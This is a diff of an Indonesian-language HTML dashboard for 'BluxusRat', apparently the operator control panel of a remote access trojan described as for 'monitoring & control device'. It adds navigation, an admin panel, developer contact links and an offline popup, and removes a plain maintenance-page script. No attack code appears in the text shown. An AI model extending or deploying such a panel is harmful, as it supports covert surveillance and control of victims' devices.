+<div class="list-item fade-in-2" id="btn-settings">
+<div class="ico-badge"><i class="fa-solid fa-gear"></i></div>
+<div class="txt"><div class="n">Settings</div><div class="d">Ganti password & foto</div></div>
+<div class="arrow"><i class="fa-solid fa-chevron-right"></i></div>
+</div>
+<div class="list-item danger fade-in-3" id="btn-logout">
+<div class="ico-badge"><i class="fa-solid fa-right-from-bracket"></i></div>
+<div class="txt"><div class="n">Log Out</div><div class="d">Keluar akun</div></div>
+<div class="arrow"><i class="fa-solid fa-chevron-right"></i></div>
+</div>
+</div>
+</div>
+
+<!-- CHANGELOG -->
+<div class="screen" id="screen-changelog">
+<div class="dash-header">
+<div class="hamburger" id="btn-hamburger-changelog"><i class="fa-solid fa-bars"></i></div>
+<span class="page-title">Changelog</span>
+<div style="width:40px"></div>
+</div>
+<div class="dash-body">
+<div class="benefit-hero fade-in">
+<div class="bh-icon"><i class="fa-solid fa-code-branch"></i></div>
+<div class="bh-title">Changelog</div>
+<div class="bh-desc">Catatan update & perubahan BluxusRat setiap patch.</div>
+</div>
+<div id="changelog-list" class="fade-in-1"></div>
+</div>
+</div>
+
+<!-- ABOUT -->
+<div class="screen" id="screen-about">
+<div class="dash-header">
+<div class="hamburger" id="btn-hamburger-about"><i class="fa-solid fa-bars"></i></div>
+<span class="page-title">About</span>
+<div style="width:40px"></div>
+</div>
+<div class="dash-body">
+<div class="about-hero fade-in">
+<div class="ab-logo">BluxusRat</div>
+<div class="ab-ver">V1 [NewEra]</div>
+<div class="ab-desc">Control panel untuk monitoring & control device.</div>
+</div>
+<div class="section fade-in-1">
+<h3><div class="ico-badge"><i class="fa-solid fa-code"></i></div> Developers</h3>
+<div class="list-item" onclick="window.open('https://wa.me/6283137236898','_blank')"><div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div><div class="txt"><div class="n">Yummy</div><div class="d">Lead Developer</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
+<div class="list-item" onclick="window.open('https://wa.me/6281234567890','_blank')"><div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div><div class="txt"><div class="n">metzzX</div><div class="d">Developer</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
+<div class="list-item" onclick="window.open('https://wa.me/6281234567890','_blank')"><div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div><div class="txt"><div class="n">kayXolcom</div><div class="d">Developer</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
+<div class="list-item" onclick="window.open('https://wa.me/6281234567890','_blank')"><div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div><div class="txt"><div class="n">.....</div><div class="d">Developer</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
+</div>
+<div class="section fade-in-2">
+<h3><div class="ico-badge"><i class="fa-solid fa-users"></i></div> Community</h3>
+<div class="list-item" onclick="window.open('https://whatsapp.com/channel/0029VbD9HztKrWQuuymMCU0w','_blank')"><div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div><div class="txt"><div class="n">Channel WhatsApp</div><div class="d">Info & update</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
+<div class="list-item" onclick="window.open('https://chat.whatsapp.com/ImF67mLQSnZ8xYwKpMO4EU','_blank')"><div class="ico-badge"><i class="fa-solid fa-comments"></i></div><div class="txt"><div class="n">Grup WhatsApp</div><div class="d">Diskusi komunitas</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
+</div>
+<div class="section fade-in-3">
+<h3><div class="ico-badge"><i class="fa-solid fa-heart"></i></div> Credits</h3>
+<div class="list-item" style="cursor:default"><div class="ico-badge"><i class="fa-solid fa-fire"></i></div><div class="txt"><div class="n">Firebase</div><div class="d">Realtime Database</div></div></div>
+<div class="list-item" style="cursor:default"><div class="ico-badge"><i class="fa-solid fa-bolt"></i></div><div class="txt"><div class="n">FazzCode</div><div class="d">API Provider</div></div></div>
+<div class="list-item" style="cursor:default"><div class="ico-badge"><i class="fa-solid fa-cloud"></i></div><div class="txt"><div class="n">Termai</div><div class="d">Upload API</div></div></div>
+<div class="list-item" style="cursor:default"><div class="ico-badge"><i class="fa-solid fa-tv"></i></div><div class="txt"><div class="n">NexaDev</div><div class="d">Anime API</div></div></div>
+</div>
+</div>
+</div>
+
+<!-- PANEL -->
+<div class="screen" id="screen-panel">
+<div class="dash-header">
+<div class="hamburger" id="btn-hamburger-panel"><i class="fa-solid fa-bars"></i></div>
+<span class="page-title" id="panel-title">Panel</span>
+<div style="width:40px"></div>
+</div>
+<div class="dash-body">
+<div class="section fade-in">
+<h3><div class="ico-badge"><i class="fa-solid fa-shield-halved"></i></div> <span id="panel-role-text">PANEL</span></h3>
+<div style="font-size:12px;color:var(--text-dim);line-height:1.6">Kelola user & sistem dari sini.</div>
+</div>
+<div class="panel-grid" id="panel-grid"></div>
+</div>
+</div>
+
+</div>
+</div>
+
+<!-- AUDIO PLAYER -->
+<div class="player-bar" id="player-bar">
+<img class="pb-cover" id="pb-cover" src="" onerror="this.style.display='none'">
+<div class="pb-info">
+<div class="t" id="pb-title">—</div>
+<div class="a" id="pb-artist">—</div>
+<div class="progress-mini"><div class="fill" id="pb-progress"></div></div>
+</div>
+<div class="pb-controls">
+<button class="pb-btn play" id="pb-toggle"><i class="fa-solid fa-play" id="pb-toggle-icon"></i></button>
+<button class="pb-close" id="pb-close"><i class="fa-solid fa-xmark"></i></button>
+</div>
+</div>
+
+<!-- SIDEBAR -->
+<div id="sidebar-backdrop"></div>
+<aside id="sidebar">
+<div class="sb-head">
 <div class="brand">BluxusRat</div>
-<div>© 2026 BluxusRat — All Rights Reserved</div>
-<div style="margin-top:4px">Halaman maintenance universal</div>
+<div class="sub" id="sb-sub">—</div>
+</div>
+<nav class="sb-nav">
+<div class="sb-item active" data-page="dash"><div class="ico-badge"><i class="fa-solid fa-house"></i></div> Dashboard</div>
+<div class="sb-item" data-page="rat"><div class="ico-badge"><i class="fa-solid fa-satellite-dish"></i></div> Rat</div>
+<div class="sb-item anime" data-page="anime"><div class="ico-badge"><i class="fa-solid fa-tv"></i></div> BluxAnime</div>
+<div class="sb-item" data-page="tools"><div class="ico-badge"><i class="fa-solid fa-toolbox"></i></div> Tools</div>
+<div class="sb-item" data-page="benefit"><div class="ico-badge"><i class="fa-solid fa-medal"></i></div> Benefit Role</div>
+<div class="sb-item" data-page="account"><div class="ico-badge"><i class="fa-solid fa-user"></i></div> Account</div>
+<div class="sb-item" data-page="changelog"><div class="ico-badge"><i class="fa-solid fa-code-branch"></i></div> Changelog</div>
+<div class="sb-item" data-page="about"><div class="ico-badge"><i class="fa-solid fa-circle-info"></i></div> About</div>
+<div id="sb-role-sep" class="hidden"><div class="sb-sep"></div><div class="sb-label">Management</div></div>
+<div class="sb-item hidden" id="sb-panel" data-page="panel"><div class="ico-badge"><i class="fa-solid fa-crown"></i></div> Panel</div>
+</nav>
+</aside>
+
+<!-- OFFLINE POPUP -->
+<div id="offline-popup">
+<div class="offline-bg-grid"></div>
+<div class="offline-glow offline-glow-1"></div>
+<div class="offline-glow offline-glow-2"></div>
+<div class="offline-container">
+<div class="offline-icon-wrap"><div class="offline-icon"><i class="fa-solid fa-wifi"></i></div></div>
+<div class="offline-badge"><span class="dot"></span><span>Tidak Ada Jaringan</span></div>
+<div class="offline-card">
+<div class="offline-title">Koneksi Terputus</div>
+<div class="offline-subtitle">BluxusRat V1 [NewEra]</div>
+<div class="offline-message"><i class="fa-solid fa-circle-info"></i>BluxusRat membutuhkan koneksi internet yang stabil untuk terus menerima update, sinkronisasi data, dan fitur real-time. Sambungkan kembali perangkat ke WiFi atau data seluler. Panel akan otomatis tersambung kembali saat koneksi tersedia.</div>
+<div class="offline-info-list">
+<div class="offline-info-item"><div class="ico"><i class="fa-solid fa-wifi"></i></div><div class="txt"><div class="l">Status Jaringan</div><div class="v warn" id="offline-network-status">Terputus</div></div></div>
+<div class="offline-info-item"><div class="ico"><i class="fa-solid fa-signal"></i></div><div class="txt"><div class="l">Koneksi Server</div><div class="v" id="offline-server-status">Menunggu koneksi...</div></div></div>
+<div class="offline-info-item"><div class="ico"><i class="fa-solid fa-clock"></i></div><div class="txt"><div class="l">Waktu Cek Terakhir</div><div class="v" id="offline-last-check">—</div></div></div>
+</div>
+<div class="offline-progress"><div class="fill"></div></div>
+<div class="offline-contact-row">
+<a class="offline-contact-btn wa" href="https://wa.me/6283137236898" target="_blank"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></a>
+<a class="offline-contact-btn ch" href="https://whatsapp.com/channel/0029VbD9HztKrWQuuymMCU0w" target="_blank"><i class="fa-solid fa-bullhorn"></i><span>Channel</span></a>
+<a class="offline-contact-btn gr" href="https://chat.whatsapp.com/ImF67mLQSnZ8xYwKpMO4EU" target="_blank"><i class="fa-solid fa-comments"></i><span>Grup</span></a>
+</div>
+</div>
+<div class="offline-footer"><div class="brand">BluxusRat</div><div>© 2026 BluxusRat — All Rights Reserved</div></div>
+</div>
 </div>
 
-</div>
+<!-- MODAL -->
+<div class="modal" id="modal"><div class="modal-box" id="modal-box"></div></div>
 
-<script>
-// ============================================================
-// URL PARAMETER (Universal)
-// ============================================================
-(function applyParams() {
-  const params = new URLSearchParams(window.location.search);
+<!-- TOAST -->
+<div id="toast-wrap"></div>
 
-  const title = params.get("title");
-  if (title) document.getElementById("cardTitle").textContent = decodeURIComponent(title);
+<script type="module" src="script.js"></script>
 
-  const subtitle = params.get("subtitle");
-  if (subtitle) document.getElementById("cardSubtitle").textContent = decodeURIComponent(subtitle);
-
-  const message = params.get("message") || params.get("msg");
-  if (message) document.getElementById("cardMessage").innerHTML = '<i class="fa-solid fa-circle-info"></i>' + decodeURIComponent(message);
-
-  const status = params.get("status");
-  if (status) document.getElementById("statusText").textContent = decodeURIComponent(status);
-
-  const version = params.get("version") || params.get("v");
-  if (version) document.getElementById("infoVersion").textContent = decodeURIComponent(version);
-
-  const serverStatus = params.get("server");
-  if (serverStatus) {
-    const el = document.getElementById("infoStatus");
-    el.textContent = decodeURIComponent(serverStatus);
-    el.className = "v " + (serverStatus.toLowerCase().includes("online") ? "ok" : "warn");
-  }
-
-  const color = params.get("color");
-  if (color) {
-    const hex = color.startsWith("#") ? color : "#" + color;
-    document.documentElement.style.setProperty("--accent", hex);
-    document.documentElement.style.setProperty("--accent-hover", hex);
-    document.documentElement.style.setProperty("--accent-glow", hexToRgba(hex, 0.4));
-  }
-
-  const icon = params.get("icon");
-  if (icon) document.getElementById("iconEl").className = "fa-solid " + decodeURIComponent(icon);
-
-  const docTitle = params.get("doctitle");
-  if (docTitle) document.title = decodeURIComponent(docTitle);
-  else if (title) document.title = "Maintenance — " + decodeURIComponent(title);
-})();
-
-function hexToRgba(hex, alpha) {
-  hex = hex.replace("#", "");
-  if (hex.length === 3) hex = hex.split("").map(c => c + c).join("");
-  const r = parseInt(hex.substring(0, 2), 16);
-  const g = parseInt(hex.substring(2, 4), 16);
-  const b = parseInt(hex.substring(4, 6), 16);
-  return "rgba(" + r + "," + g + "," + b + "," + alpha + ")";
-}
-
-// ============================================================
-// LIVE CLOCK
-// ============================================================
-function updateTime() {
-  const d = new Date();
-  const hh = String(d.getHours()).padStart(2, "0");
-  const mm = String(d.getMinutes()).padStart(2, "0");
-  const ss = String(d.getSeconds()).padStart(2, "0");
-  const el = document.getElementById("infoTime");
-  if (el) el.textContent = hh + ":" + mm + ":" + ss;
-}
-updateTime();
-setInterval(updateTime, 1000);
-
-// ============================================================
-// OFFLINE / ONLINE DETECTION
-// ============================================================
-function setOfflineMode() {
-  document.getElementById("mainIcon").classList.add("offline");
-  document.getElementById("iconEl").className = "fa-solid fa-wifi";
-  document.getElementById("statusBadge").classList.add("warning");
-  document.getElementById("statusText").textContent = "Tidak Ada Jaringan";
-  document.getElementById("mainCard").classList.add("offline");
-  document.getElementById("cardTitle").textContent = "Koneksi Terputus";
-  document.getElementById("cardSubtitle").textContent = "BluxusRat V1 [NewEra]";
-  document.getElementById("cardMessage").innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i>Perangkat kamu sedang tidak terhubung ke internet. Aplikasi ini membutuhkan jaringan untuk terus melakukan update dan sinkronisasi data. Sambungkan kembali perangkat ke WiFi atau data seluler. Halaman akan otomatis tersambung kembali saat koneksi tersedia.';
-  const netEl = document.getElementById("infoNetwork");
-  netEl.textContent = "Terputus";
-  netEl.className = "v warn";
-  const srvEl = document.getElementById("infoStatus");
-  srvEl.textContent = "Menunggu jaringan";
-  srvEl.className = "v warn";
-  document.title = "Tidak Ada Jaringan — BluxusRat";
-}
-
-function setOnlineMode() {
-  document.getElementById("mainIcon").classList.remove("offline");
-  document.getElementById("iconEl").className = "fa-solid fa-screwdriver-wrench";
-  document.getElementById("statusBadge").classList.remove("warning");
-  document.getElementById("statusText").textContent = "Sedang Maintenance";
-  document.getElementById("mainCard").classList.remove("offline");
-  document.getElementById("cardTitle").textContent = "BluxusRat";
-  document.getElementById("cardSubtitle").textContent = "V1 [NewEra]";
-  document.getElementById("cardMessage").innerHTML = '<i class="fa-solid fa-circle-info"></i>Server sedang dalam proses maintenance. Kami sedang melakukan peningkatan sistem untuk pengalaman yang lebih baik. Silakan coba beberapa saat lagi.';
-  const netEl = document.getElementById("infoNetwork");
-  netEl.textContent = "Terhubung";
-  netEl.className = "v ok";
-  const srvEl = document.getElementById("infoStatus");
-  srvEl.textContent = "Maintenance";
-  srvEl.className = "v warn";
-  document.title = "Maintenance — BluxusRat";
-}
-
-window.addEventListener("offline", setOfflineMode);
-window.addEventListener("online", setOnlineMode);
-
-// Cek status awal
-if (!navigator.onLine) setOfflineMode();
-
-// Auto-check setiap 3 detik (untuk timeout)
-setInterval(function() {
-  if (!navigator.onLine) {
-    if (!document.getElementById("mainIcon").classList.contains("offline")) setOfflineMode();
-  } else {
-    if (document.getElementById("mainIcon").classList.contains("offline")) setOnlineMode();
-  }
-}, 3000);
-</script>
 </body>
 </html>
